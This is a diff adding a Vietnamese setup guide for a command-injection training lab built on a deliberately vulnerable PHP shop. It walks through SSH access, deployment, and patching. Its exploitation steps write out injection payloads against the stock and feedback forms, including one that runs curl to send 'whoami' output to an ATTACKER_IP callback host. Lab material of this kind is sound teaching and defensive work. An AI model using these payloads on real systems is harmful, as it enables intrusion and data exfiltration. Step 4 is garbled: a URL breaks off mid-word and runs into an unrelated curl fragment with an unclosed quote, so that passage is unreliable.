@@ -1,0 +1,326 @@
+╔══════════════════════════════════════════════════════════════════╗
+║           HƯỚNG DẪN SETUP: SSH + SOURCE CODE + WEBSERVER         ║
+║          Command Injection Lab - Vulnerable e-commerce           ║
+╚══════════════════════════════════════════════════════════════════╝
+
+📍 THÔNG TIN MÁY ẢO (UBUNTU SERVER):
+   ⚠️  CHƯA CHẮC LÀ DỮ LIỆU BẠN CỦA BẠN
+   
+   Ví dụ dưới đây dùng:
+   - IP Address: 192.168.11.19      ← Thay bằng IP của máy ảo bạn
+   - Username: hai                  ← Thay bằng user của máy ảo bạn
+   - Document Root: /var/www/html/
+   - GitHub Repo: https://github.com/Haihihihihu/CommandInjection.git
+
+   ⚡ CÁC BƯỚC TÌM IP VÀ USERNAME THỰC TẾ:
+      1. Bật máy ảo Ubuntu
+      2. Đăng nhập vào máy ảo
+      3. Mở terminal, chạy: whoami
+         → Đó là USERNAME (ví dụ: ubuntu, hai, student, etc.)
+      4. Chạy: ip a | grep inet | grep -v 127.0.0.1 | awk '{print $2}'
+         → Đó là IP của máy ảo (ví dụ: 192.168.x.x/24)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔑 BƯỚC 1: KẾT NỐI SSH TỚI MÁY ẢO
+
+⚠️  THAY THẾ DỮ LIỆU SAU:
+   - Thay "hai" bằng USERNAME của máy ảo bạn
+   - Thay "192.168.11.19" bằng IP của máy ảo bạn
+   
+Trên máy host/laptop của bạn (Windows/Mac/Linux):
+
+   ssh USERNAME@IP_MACHINE_AO
+   
+   Ví dụ:
+   ssh hai@192.168.11.19
+   ssh ubuntu@192.168.100.5
+   ssh student@10.0.0.50
+
+   → Nhập mật khẩu khi được hỏi
+   → Bạn sẽ vào shell của Ubuntu Server
+
+Nếu nhận lỗi "Connection refused":
+   → Kiểm tra IP: ping 192.168.11.19
+   → Kiểm tra SSH service: ssh -v hai@192.168.11.19 (xem chi tiết lỗi)
+   → Trên máy ảo: sudo service ssh status
+   → Khởi động SSH: sudo service ssh start
+
+💡 TIP: Tạo SSH key để không cần nhập password mỗi lần
+   ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
+   ssh-copy-id USERNAME@IP_MACHINE_AO
+   
+   Ví dụ:
+   ssh-copy-id hai@192.168.11.19
+   ssh-copy-id ubuntu@192.168.100.5
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📥 BƯỚC 2: CLONE REPOSITORY
+
+Sau khi SSH vào máy ảo:
+
+   cd ~
+   git clone https://github.com/Haihihihihu/CommandInjection.git
+   cd CommandInjection
+
+   → Bạn có thể khám phá source code tại đây
+
+Cấu trúc folder:
+
+   CommandInjection/
+   ├── app/
+   │   ├── controllers/
+   │   │   ├── ProductController.php  (KB1: In-band injection)
+   │   │   ├── FeedbackController.php (KB2 & KB3: Blind injection)
+   │   │   ├── HomeController.php
+   │   │   └── OrderController.php
+   │   └── views/
+   │       ├── product_detail.php
+   │       ├── feedback.php
+   │       ├── home.php
+   │       └── result.php
+   ├── public/
+   │   └── css/
+   │       └── style.css
+   ├── index.php                      (Router chính)
+   ├── config.php                     (Database config giả)
+   ├── .env                           (Environment variables)
+   ├── stockreport.pl                 (Perl script cho KB1)
+   ├── EXPLOIT_SCENARIO_1.txt         (Hướng dẫn KB1)
+   ├── EXPLOIT_SCENARIO_2.txt         (Hướng dẫn KB2)
+   ├── EXPLOIT_SCENARIO_3.txt         (Hướng dẫn KB3 + OOB)
+   ├── PATCH_KB1.txt                  (Cách vá lỗ hổng KB1)
+   ├── PATCH_KB2_KB3.txt              (Cách vá lỗ hổng KB2& KB3)
+   └── README_SCENARIOS.txt           (Tổng quan toàn bộ)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🌐 BƯỚC 3: KHỞI ĐỘNG WEB SERVER
+
+Máy ảo đã có Apache 2.4.58 chạy sẵn:
+
+✅ CÁCH 1: Apache (Recommended - Đã chạy)
+
+   # Kiểm tra Apache status
+   sudo service apache2 status
+
+   # Nếu chưa chạy, khởi động:
+   sudo service apache2 start
+
+   # Truy cập web:
+   http://192.168.11.19/
+   http://192.168.11.19/product
+   http://192.168.11.19/feedback
+
+   Document Root: /var/www/html/
+
+
+✅ CÁCH 2: PHP Built-in Server (Nhanh cho dev)
+
+   # Từ thư mục CommandInjection:
+   cd ~/CommandInjection
+   php -S 0.0.0.0:8000
+
+   # Truy cập web:
+   http://192.168.11.19:8000/
+   http://192.168.11.19:8000/product
+   http://192.168.11.19:8000/feedback
+
+   💡 TIP: Dùng này nếu muốn thay đổi code mà không cần reload Apache
+
+
+✅ CÁCH 3: Nginx + PHP-FPM (Alternative)
+
+   # Kiểm tra Nginx
+   sudo service nginx status
+
+   # Nếu cần, config Nginx tương tự Apache
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🧪 BƯỚC 4: TEST WEBSITE
+
+Truy cập qua browser từ máy host:
+
+   http://IP_MACHINE_AO/
+   → Trang chủ CyberShop
+
+   http://IP_MACHINE_AO/?url=product&productId=1
+   → Chi tiết sản phẩm (KB1: Stock checker form)
+
+   http://IP_MACHINE_AO/?url=feedback
+   → Form feedback (KB2 & KB3: Email injection)
+   
+   Ví dụ thực tế:
+   http://192.168.11.19/
+   http://192.168.100.5/
+   http://10.0.0.50/ock \
+     -d "productId=2&storeId=1%3Bwhoami"
+   → Response sẽ hiện "www-data"
+   
+   Ví dụ:
+   curl -X POST http://192.168.11.19/product/stock -d "productId=2&storeId=1%3Bwhoami"
+   curl -X POST http://192.168.100.5/product/stock -d "productId=2&storeId=1%3Bwhoami
+
+   curl -X POST http://192.168.11.19/product/stock \
+     -d "productId=2&storeId=1%3Bwhoami"
+   → Response sẽ hiện "www-data"
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📖 BƯỚC 5: KHÁM PHÁ LỖ HỔNG
+
+1️⃣ IN-BAND COMMAND INJECTION (KB1)
+   File: EXPLOIT_SCENARIO_1.txt
+   Endpoint: POST /product/stock
+   Payload: productId=2&storeId=1%3Bwhoami
+   Result trả về trong response
+
+2️⃣ BLIND OUTPUT REDIRECTION (KB2)
+   File: EXPLOIT_SCENARIO_2.txt
+   Endpoint: POST /feedback/send
+   Payload: email=a||whoami>/var/www/images/out.txt||b
+   Result ghi vào file, đọc qua /image?filename=out.txt
+
+3️⃣ OUT-OF-BAND EXFILTRATION (KB3)
+   File: EXPLOIT_SCENARIO_3.txt
+   Endpoint: POST /feedback/send
+   Payload: email=x;curl http://ATTACKER_IP:8000/?d=`whoami`;
+   Result gửi callback đến attacker server
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🛠️  BƯỚC 6: QUẢN LÝ LỖ HỔNG
+
+Tắt lỗ hổng (Bật patch):
+   nano app/controllers/ProductController.php
+   → Comment 2 dòng vulnerable code
+   → Uncomment 1 trong 2 cách vá
+   → Save: Ctrl+O, Ctrl+X
+
+Tải lại web:
+   Apache: sudo service apache2 reload
+   PHP built-in: Ctrl+C rồi chạy lại php -S
+
+Test payload lại:
+   curl -X POST http://192.168.11.19/product/stock \
+     -d "productId=2&storeId=1%3Bwhoami"
+   → Bây giờ không còn output www-data
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💾 BƯỚC 7: THAY ĐỔI SOURCE CODE
+
+Chỉnh sửa file trực tiếp trên máy ảo:
+
+   # SSH vào máy, thay đổi code
+   ssh hai@192.168.11.19
+   nano /var/www/html/app/controllers/ProductController.php
+
+   # Hoặc dùng SCP để copy file qua máy host
+   scp -r hai@192.168.11.19:/var/www/html ./local_copy
+
+   # Chỉnh sửa từ máy host, copy lại
+   scp -r ./local_copy/* hai@192.168.11.19:/var/www/html/
+
+   # Apache tự reload khi file .php thay đổi
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔍 BƯỚC 8: DEBUG & LOGS
+
+Xem Apache error logs:
+
+   sudo tail -f /var/apache2/logs/error.log   # Nếu có
+   sudo tail -f /var/log/apache2/error.log    # Thường ở đây
+
+Xem access logs:
+
+   sudo tail -f /var/log/apache2/access.log
+
+Xem PHP output:
+
+   php -S 0.0.0.0:8000 2>&1
+
+Xem permission errors:
+
+   ls -la /var/www/html/
+   ls -la /var/www/images/
+   sudo chown -R www-data:www-data /var/www/
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📝 MỘT SỐ LỆNH HỮUI DỤC
+
+# Kiểm tra PHP version
+php -v
+
+# Kiểm tra Apache modules
+sudo apache2ctl -M | grep rewrite
+
+# Test route routing
+curl -X GET "http://192.168.11.19/?url=product&productId=1"
+
+# Tải file từ máy ảo về máy host
+scp hai@192.168.11.19:/var/www/html/config.php .
+
+# Gửi file từ máy host lên máy ảo
+scp ./modified_file.php hai@192.168.11.19:/var/www/html/app/
+
+# Kiểm tra port 80/8000
+netstat -tlnp | grep 80
+netstat -tlnp | grep 8000
+
+# Kill process nếu cần
+pkill -f "php -S"
+sudo service apache2 stop
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ TROUBLESHOOT
+
+Q: "Connection refused" khi SSH
+A: Kiểm tra IP (ping 192.168.11.19), restart SSH (sudo service ssh restart)
+
+Q: "404 Not Found" khi vào web
+A: Kiểm tra Apache status, route không match, xem error log
+
+Q: Payload không thực thi command
+A: Kiểm tra lỗ hổng đang BẬT, test với curl trước
+
+Q: "Permission denied" khi ghi file
+A: sudo chown -R www-data:www-data /var/www/images/
+
+Q: Thay đổi code không apply
+A: Restart Apache (sudo service apache2 restart) hoặc dùng PHP built-in (tự reload)
+
+Q: Cần thay IP của máy ảo
+A: Kiểm tra: ip a | grep 192.168.11
+   Rồi update payload, EXPLOIT_SCENARIO_3.txt, tất cả file liên quan
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ READY TO GO!
+
+Bạn bây giờ có thể:
+1. SSH vào máy ảo
+2. Clone source code từ GitHub
+3. Access web qua http://192.168.11.19/
+4. Khai thác 3 kịch bản Command Injection
+5. Chỉnh sửa code trực tiếp
+6. Vá lỗ hổng và test lại
+
+Hãy bắt đầu bằng EXPLOIT_SCENARIO_1.txt!
+
+═══════════════════════════════════════════════════════════════════
+                    Happy Hacking! 🎯
+═══════════════════════════════════════════════════════════════════
